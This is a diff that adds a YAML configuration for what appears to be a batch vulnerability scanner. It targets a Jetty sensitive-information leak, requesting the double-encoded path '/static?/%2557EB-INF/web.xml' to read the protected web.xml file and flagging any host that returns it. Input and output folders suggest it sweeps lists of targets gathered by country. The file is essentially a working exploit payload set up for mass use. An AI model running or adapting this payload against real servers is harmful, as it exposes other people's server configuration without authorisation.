@@ -1,0 +1,16 @@
+targetPath: /static?/%2557EB-INF/web.xml
+targetMethod: get
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:7890
+    https: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+targetJson:
+targetData:
+targetReExpression:
+    respStatusCode: 200
+    respBody: <web-app>
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/jetty敏感信息泄漏/
+targetRestText: 3
